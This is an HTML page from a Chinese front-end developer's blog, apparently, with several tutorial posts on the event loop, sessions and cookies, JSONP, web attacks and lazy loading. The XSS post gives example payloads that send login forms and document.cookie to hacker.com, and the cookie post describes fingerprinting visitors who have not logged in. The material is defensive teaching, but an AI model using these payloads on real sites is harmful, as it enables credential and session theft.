          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/js/eventloop.html" itemprop="url">
                  关于事件循环event-loop
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-01T21:47:15+08:00">
                2018-01-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="js单线程"><a href="#js单线程" class="headerlink" title="js单线程"></a>js单线程</h1><p>同一时间只干一件事，干完一件事再干下一件事，<br>如果前一个任务耗时很长，后一个任务也得一直等着</p>
<p>为什么这样设计？<br>js 要指挥浏览器干活，如果有两个线程同时执行任务，一个删除DOM，一个修改该DOM，浏览器会不知道以哪个线程为准</p>
<h1 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h1><p>同步任务，在主线程上排队执行的任务，前一个执行完才能执行后一个任务<br>异步任务，一开始不进入主线程，而进入‘任务队列’被挂起，只有‘任务队列’通知主线程某个异步任务可以执行了，该任务才会进入主线程<br>或者主线程上没有要执行的任务了，就会去任务队列拿任务 ，在确认该到达规定时间后，就给到主线程进行执行其对应的回调函数</p>
<h1 id="event-Loop"><a href="#event-Loop" class="headerlink" title="event Loop"></a>event Loop</h1><p>主线程从”任务队列”中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）<br>setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，即尽可能早得执行<br>另外如果主线程的栈中当前代码耗时很长，要等很久，按照先主线程，再任务队列的执行顺序，<br>就没办法保证setTimeout的回调函数fn能够在指定的时间执行</p>
<h1 id="node-js-event-loop"><a href="#node-js-event-loop" class="headerlink" title="node.js event loop"></a>node.js event loop</h1><p>nodejs 运行机制：<br> (1）V8引擎解析JavaScript脚本。<br>（2）解析后的代码，调用Node API。<br>（3）libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。<br>（4）V8引擎再将结果返回给用户。</p>
<p>与任务队列相关方法<br>process.nextTick:在主线程任务全部结束后，读取任务队列的任务之前执行它所指定的函数，<br>如果指定函数里还套嵌process.nextTick方法，或者有多个process.nextTick方法，都要在本轮读取任务队列前执行完<br>setImmediate：它指定的任务总是在下一次的eventloop时执行，<br>如果setImmediate与setTimeout(fn,0)各自添加了一个回调函数，那么在下一loop时，他们回调函数的顺序是不确定<br>如果setImmediate套嵌setImmediate方法,则套嵌的回调函数会被注册到下一轮事件循环中再执行</p>
<p>即多个process.nextTick语句总是在当前”执行栈”一次执行完，多个setImmediate可能则需要多次loop才能执行完。</p>
<p><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">相关链接</a></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>task/macrotask:script（整体代码）, setTimeout, setInterval, setImmediate, I/O, UI rendering<br>setTimeout() 设置的异步延迟事件；<br>DOM 操作相关如布局和绘制事件；<br>网络 I/O 如 AJAX 请求事件；<br>用户操作事件，如鼠标点击、键盘敲击。<br>micotask:process.nextTick, Promises（这里指浏览器实现的原生 Promise）, Object.observe, MutationObserver<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">process.nextTick(() =&gt; &#123;</span><br><span class="line">  console.log(&apos;nextTick&apos;)</span><br><span class="line">&#125;)</span><br><span class="line">Promise.resolve()</span><br><span class="line">  .then(() =&gt; &#123;</span><br><span class="line">    console.log(&apos;then&apos;)</span><br><span class="line">  &#125;)</span><br><span class="line">setImmediate(() =&gt; &#123;</span><br><span class="line">  console.log(&apos;setImmediate&apos;)</span><br><span class="line">&#125;)</span><br><span class="line">console.log(&apos;end&apos;)</span><br><span class="line"></span><br><span class="line">//结果</span><br><span class="line">end</span><br><span class="line">nextTick</span><br><span class="line">then</span><br><span class="line">setImmediate</span><br></pre></td></tr></table></figure></p>
<p>micro-task在ES2015规范中称为Job,<br>promise.then的执行其实是向PromiseJobs添加Job</p>
<p>在eventloop中，一个task执行完会检查micotask队列，如果有，则先执行micotask，然后再去异步队列领取任务<br><a href="https://github.com/creeperyang/blog/issues/21" target="_blank" rel="noopener">相关</a><br><a href="https://segmentfault.com/a/1190000010913949" target="_blank" rel="noopener">相关</a><br><a href="https://www.cnblogs.com/dong-xu/p/7000139.html" target="_blank" rel="noopener">相关</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/cache/session&cookie.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/cache/session&cookie.html" itemprop="url">
                  session 和cookie
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-28T08:17:15+08:00">
                2017-12-28
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="正常情况下身份识别"><a href="#正常情况下身份识别" class="headerlink" title="正常情况下身份识别"></a>正常情况下身份识别</h1><p>用户提交登录信息，服务器拿到登录信息进行验证之后，<br>为该用户在session表中建立唯一sessionid,然后在返回响应的时候，将sessionid放在set-cookie中告诉浏览器，将sessionid 放在cookie表中，下次请求的时候放在cookie中再发给我<br>这样用户在已登录的状态下进行的访问请求,浏览器都会在报文中将sessionid放在cookie中给回服务器<br>服务器拿到cookie 就能判断用户是否进行了登录，并根据session表确定登录身份</p>
<h1 id="session-机制"><a href="#session-机制" class="headerlink" title="session 机制"></a>session 机制</h1><p>当用户访问服务器时,服务器就会先检查请求有没有带sessionid,<br>如果没带的话,就为该用户在session列表中建立一个session，<br>(这个session是存储特定用户会话所需的属性及配置信息的一个对象，开发人员可以控制里面是什么内容，可以自定义的)<br>并生成唯一sessionid通过set-cookie给回用户<br>如果有带的话,就根据sessionid 在列表中查找对应的session,将session 取出来使用，如果没找到则可能新建一个</p>
<p>1.浏览器禁用cookie解决办法<br>让浏览器重写url：将sessionid 以参数或者附加信息方式放在url后面传递给服务器<br>表单隐藏字段：服务器在返回表单的时候就将sessionid 以隐藏字段方式给过去,客户端提交表单的时候就一并传回来</p>
<p>2.session什么时候被删除<br>过期就会自动删除<br>执行特定删除命令的时候，比如注销<br>session存在内存中的时候，当服务器被重启或者停止时，session列表会被清空</p>
<p>3.session存储<br>一般存在内存中，但服务器重启或者停止会被清空<br>如果想持久保存，可以放在硬盘里面，这样服务器重启或者停止不会被清空</p>
<h1 id="cookie-机制"><a href="#cookie-机制" class="headerlink" title="cookie 机制"></a>cookie 机制</h1><p>浏览器拿到set-cookie后，会根据sessionid ,域名，路径等相关信息，生成cookie，存到cookie列表中<br>当用户要请求服务器时，就根据请求资源路径去查cookie表，找到的cookie可用的范围如果大于等于请求路径,<br>就将cookie放在请求头给回服务器</p>
<p>1.cookie存储<br>会话cookie存储在内存中，页面关闭就删除<br>设置了过期时间的cookie,会被存储在硬盘上，直到超过设定时间才会被删除</p>
<p>2.cookie与浏览器<br>存储在硬盘上的cookie可以在不同浏览器进程间共享<br>对于内存上的cookie不同浏览器有不同处理方式<br>IE通过 ctrl+N 的方式打开的窗口可以与原窗口共享cookie,但其他方式不行<br>而火狐的所有进程和标签页都可以共享cookie</p>
<p>一般情况下通过js window.open打开的窗口会与原窗口共享内存cookie</p>
<h1 id="游客识别跟踪"><a href="#游客识别跟踪" class="headerlink" title="游客识别跟踪"></a>游客识别跟踪</h1><p>用户未登录情况下进行页面请求，且之后都不进行登录操作的情况下，还要与用户保持可进行身份识别的通信，<br>这种情景解决办法可以有<br>A.<br>一般就需要依靠识别机器来识别用户了<br>首先给未登录用户设置访问用户cookie,<br>根据不同机型用canvas写字像素是不一样的原理<br>这个cookie由游客设备的各种机器特征码组合起来生成给到服务器，<br>服务器存起来<br>下次再访问的时候，就依靠客户端建立的cookie进行识别<br>或者将机器信息传给服务器，由服务器生成再传给浏览器</p>
<p>B.<br>使用fingerprint.js包，它是一个可以根据浏览器的代理字符串，屏幕色深，语言，插件安装与支持的 MIME 类型，时区偏移量和其他功能，如本地存储和会话存储等等，<br>然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 存储就可以识别浏览器</p>
<p>由未登录到登录态要做的事情就要注意两个账号的关联</p>
<p>奇葩问题：在一台设备登录过多个账号的情况下，怎样进行未登录数据的关联<br>首先设备一般会让你先退出再登录另一个账号,<br>即便要登录多个账号,要做关联，在第一个用户登录后就关联完了，后面多个再登录已经不再是由未登录到登录状态了</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/js/jsonp.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/js/jsonp.html" itemprop="url">
                  关于jsonp
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:57:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="关于jsonp"><a href="#关于jsonp" class="headerlink" title="关于jsonp"></a>关于jsonp</h1><p>是一种json数据的使用模式的名称，<br>获取的资料可以是任意js</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.在script标签中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.xxxx.com/myService.aspx?param=senddata&amp;jsonp=callbackFunction&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">js:</span><br><span class="line">function callbackFunction(result,methodName)&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>服务端提供的js脚本会根据param=senddata等查询条件过滤数据，根据jsonp=callbackFunction，动态生成callbackFunction函数，把要传递的数据以参数形式传递进去<br>例，这里服务端js会生成如下语句供回调<br>callbackFunction(data1,dat2),data1,data2即传递的数据<br>2.在ajax中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">dataType:&apos;jsonp&apos;,</span><br><span class="line">data:&apos;id=10&apos;,</span><br><span class="line">jsonp:&apos;jsonp_callback&apos;,</span><br><span class="line">url:&apos;http://www.xxxxx.com/getdata&apos;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">//dostuff</span><br><span class="line">&#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>可以直接的success回调函数中使用数据进行处理<br>3.在$.get中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$.get(</span><br><span class="line">&apos;http://xxxxxx.com/services.php?callback=?&apos;,</span><br><span class="line">&#123;</span><br><span class="line">	param: data,  //参数</span><br><span class="line">	function (json) &#123; //dosomething &#125;,  //回调函数，?会替换为这里</span><br><span class="line">  &apos;jsonp&apos;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>4.在$get.json中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(&quot;http://xxxxx.com/services?param1=data1&amp;param1=data2&amp;format=json&amp;jsoncallback=?&quot;,</span><br><span class="line">function(data)&#123; //回调函数</span><br><span class="line">//dosomething</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/safe/XSSCSRF.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/safe/XSSCSRF.html" itemprop="url">
                  XSS 与 CSRF
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:56:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss 跨站脚本攻击"></a>xss 跨站脚本攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在页面HTML注入js代码，获取页面信息，再将信息传递到攻击者站点</p>
<h2 id="注入js方法"><a href="#注入js方法" class="headerlink" title="注入js方法"></a>注入js方法</h2><p>1.直接将获取信息的代码放在<script></script>标签里面，利用拼接html的过程，将攻击代码注入到HTML<br>2.将攻击代码代码放在攻击者站点里面,利用script标签src属性,将文件引入<br>3.利用页面标签事件属性，攻击代码以触发函数的形式注入，标签事件触发同时触发获取信息的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//例1.原本访问www.original.com/login?id=maya,实现自动将maya赋值到ID输入框里面</span><br><span class="line">&lt;input type=&apos;text&apos; value=&apos;maya&apos;&gt;</span><br><span class="line">//但如果在访问的同时注入攻击代码，如下</span><br><span class="line">www.original.com/login?id=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&apos;login&apos;);+f.action=&apos;http://hacker.com/pwee&apos;;+f.method=&apos;get&apos;;&lt;/script&gt;&quot;</span><br><span class="line">//页面代码就会变成</span><br><span class="line">&lt;input type=&apos;text&apos; value=&apos;&apos;&gt;&lt;script&gt;var f=document.getElementById(&apos;login&apos;); f.action=&apos;http://hacker.com/pwee&apos;; f.method=&apos;get&apos;;&lt;/script&gt;</span><br><span class="line">//登录按钮的id为login，即用户输入id,密码，等登录信息后点击登录按钮时，不仅会向正常的登录网站www.original.com发送登录信息,</span><br><span class="line">//同时会向http://hacker.com站点发送登录信息,攻击者即得到用户的登录信息，如果是支付页面，即可以得到支付密码</span><br><span class="line"></span><br><span class="line">//例2.获取用户登录态cookie的攻击代码xss.js放在攻击者的站点,如下</span><br><span class="line">var content = escape(document.cookie) //escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</span><br><span class="line">document.write(&quot;&lt;img src=&apos;http://hacker.com/?&apos;&quot;);</span><br><span class="line">document.write(content);</span><br><span class="line">document.write(&apos;&gt;&apos;);</span><br><span class="line">//本次代码注入的方式变为访问</span><br><span class="line">www.original.com/login?id=&quot;&gt;&lt;script src=&apos;http://hacker.com/xss.js&apos;&gt;&lt;/script&gt;&quot;</span><br><span class="line">就会执行xss.js的代码，将用户cookie通过img的src发出的请求送到hacker站点</span><br><span class="line"></span><br><span class="line">//例3. form表单提交时，给提交按钮添加触发事件，触发函数即注入的攻击代码</span><br><span class="line">&lt;input type=&apos;submit&apos; onclick=&apos;hacker()&apos;&gt;</span><br><span class="line">//如果需要用户无察觉的触发，可使用onmousemove、onload等事件进行触发</span><br></pre></td></tr></table></figure></p>
<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对代码进行漏洞检查；<br>对特殊字符进行encode;<br>对富文本进行白名单处理;<br>在js里面不要用eval,innerHTML；<br>在response头部的set-cookie中添加httponly,不允许脚本操作document.cookie;<br>使用x-xss-protection报头<br>对特殊字符进行encode<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ’ 替换成 &#39;<br>把 ’ 替换成 &quot;<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</p>
<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击站点通过用户触发攻击代码获取登录态，伪造用户身份向源站请求资源或发送信息</p>
<p><img src="/image/csrf.png" alt="csrf"><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">相关链接</a></p>
<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>1.利用token,让token以参数角色返回服务器，服务器对比之前保存的token，从而判断该请求来自正常页面请求，攻击站点无法获取到token，因此就不能进行任何操作<br>2.利用攻击站点无法获取cookie的弱点，对获取到的cookie进行转换成token后以参数形式返回后台，因为攻击站点没法获取cookie,也就没办法返回参数<br>3.使用strict-transport-security报头</p>
<h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><p>前端提交的数据未经校验处理直接存到数据库，然后从数据库中读取直接插入到页面中<br>1.如果提交的数据本来含有可解析的代码，从数据库读取后在插入过程中可造成XSS攻击<br>2.如果提交的数据含有SQL查询语句，且被直接拼接到SQL语句中被执行，可能会导致执行结果与预期不同的现象</p>
<h2 id="防范-2"><a href="#防范-2" class="headerlink" title="防范"></a>防范</h2><p>对前端提交的数据进行严格校验</p>
<h1 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h1><p>表现就是DNS服务器上解析表被篡改，导致将正常访问的域名指向篡改后的域名</p>
<h1 id="HTTP劫持"><a href="#HTTP劫持" class="headerlink" title="HTTP劫持"></a>HTTP劫持</h1><p>数据包被修改或插入，导致页面出现弹窗广告<br>解决办法就是使用HTTPS<br>使用upgrade-insecure-request报头请求升级HTTPS<br>使用content-security-policy报头响应升级HTTPS</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/lazyload.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/lazyload.html" itemprop="url">
                  懒加载
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:55:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="lazy"><a href="#lazy" class="headerlink" title="lazy"></a>lazy</h1><h2 id="图片lazyload"><a href="#图片lazyload" class="headerlink" title="图片lazyload"></a>图片lazyload</h2><p>基本原理是图片image标签的src属性在构建DOM时，先给一特定的默认值，可以是本地图片路径，然后通过监听scroll事件，<br>判断图片所在位置是否在可视屏幕里面，如果在可视屏幕里面，就将要加载的真正图片资源给到image的src属性<br>当然通过判断src的值是否是默认值，就可以知道图片是否已经被加载过，加载过就不会被从新赋值，然后重新加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function lazyload() &#123;</span><br><span class="line">              const images = document.getElementsByTagName(&apos;img&apos;)</span><br><span class="line">              const len = images.length</span><br><span class="line">              let n = 0</span><br><span class="line">              return function() &#123;</span><br><span class="line">                  console.log(1)</span><br><span class="line">                  const seeHeight = document.documentElement.clientHeight</span><br><span class="line">                  const scrollTop = document.documentElement.scrollTop || document.body.scrollTop</span><br><span class="line">                  for (let i = n; i &lt; len; i++) &#123;</span><br><span class="line">                      if (images[i].offsetTop &lt; seeHeight + scrollTop) &#123; //是否在可视范围</span><br><span class="line">                          if (images[i].getAttribute(&apos;src&apos;) === &apos;默认图片的url&apos;) &#123;</span><br><span class="line">                              images[i].src = images[i].getAttribute(&apos;data-src&apos;) //赋值资源链接</span><br><span class="line">                          &#125;</span><br><span class="line">                          n = n + 1</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          var loadImages = lazyload()</span><br><span class="line">          window.onload = function () &#123;</span><br><span class="line">              loadImages()</span><br><span class="line">              window.addEventListener(&apos;scroll&apos;, loadImages, false)</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure></p>
<p>但缺点就是，只要触发了scroll事件，就会去调函数，无论图片有没有被加载，这样就会造成一些没用的调用，所以对此进行改进</p>
<p>改进方式一：使用节流阀（Throttle）</p>
<p>响应函数函数在一定时间内只允许被调用一次,函数能否被执行根据时间来确定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn, delay, atleast) &#123;</span><br><span class="line">                let timeout = null</span><br><span class="line">                let startTime = new Date()</span><br><span class="line">                return function() &#123;</span><br><span class="line">                    const curTime = new Date()</span><br><span class="line">                    clearTimeout(timeout) //3，取消限定时间内预约的将来的函数执行,防止多次执行</span><br><span class="line">                    if (curTime - startTime &gt;= atleast) &#123;//1,超过限定时间，执行一次</span><br><span class="line">                        fn()</span><br><span class="line">                        startTime = curTime</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        timeout = setTimeout(fn, delay) //2，没超过限定时间，在限定时间内不执行，延续时间到超过限定时间后再执行</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">var loadImages = lazyload()</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">    loadImages()</span><br><span class="line">    window.addEventListener(&apos;scroll&apos;, throttle(loadImages, 500, 1000), false)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>改进方式二：使用防抖动技术(debounce)</p>
<p>当事件发生时，不会立即激活回调。<br>等待一定的时间并检查相同的事件是否再次触发。<br>如果是，重置定时器，并再次等待。<br>如果在等待期间没有发生相同的事件，等待时间结束后就立即激活回调。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function debounced(fn,delay) &#123;</span><br><span class="line">  clearTimeout(timeoutID);  // reset timer</span><br><span class="line">  timeoutID = setTimeout(function() &#123;</span><br><span class="line">    // wait for some time</span><br><span class="line">    // and check if event happens again</span><br><span class="line">    fn()</span><br><span class="line">  &#125;, delay);</span><br><span class="line">&#125;;</span><br><span class="line">var loadImages = lazyload()</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">    loadImages()</span><br><span class="line">    window.addEventListener(&apos;scroll&apos;, debounced(loadImages, 500), false)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="组件的lazyload"><a href="#组件的lazyload" class="headerlink" title="组件的lazyload"></a>组件的lazyload</h2><p>实现一：AMD模式require实现异步加载模块<br>在AMD模式里面每个模块都会被define包裹，对无序的代码进行有序的模块化定义，目的就是为了使js能够按照一定秩序执行，<br>require模块时，会根据模块之间的依赖关系按顺序加载</p>
<p>实现二：使用require.ensure()方法调用异步模块，配置chunkFilename为异步模块要打包到的地方，webpack打包时，就会根据依赖关系打包成异步加载的模式，在运行时就会异步加载模块</p>
<p>实现三：将组建都标签化后，通过对标签添加是否异步的标志，从而实现对该组件的异步加载</p>
<h1 id="预加载技术"><a href="#预加载技术" class="headerlink" title="预加载技术"></a>预加载技术</h1><p>1.提前加载下一页数据<br>2.加载页面时，尽早发出数据请求，实现页面数据预加载</p>
<h1 id="图片的-base64-编码"><a href="#图片的-base64-编码" class="headerlink" title="图片的 base64 编码"></a>图片的 base64 编码</h1><p>图片的 base64 编码就是可以将一图片数据编码成一串字符串，使用该字符串代替代码中的图像地址<br>图片就可以随着HTML的下载同时下载到本地，不用为了下载图片向服务器发出请求</p>
<p>将图片转化为Base64编码的工具，可以使用线上网站，也可以用以下方法<br>在 chrome 下打开新的标签页，然后把要转化的图片直接拖入浏览器，打开控制台，点 Source，source的内容内容就是图片base64编码</p>
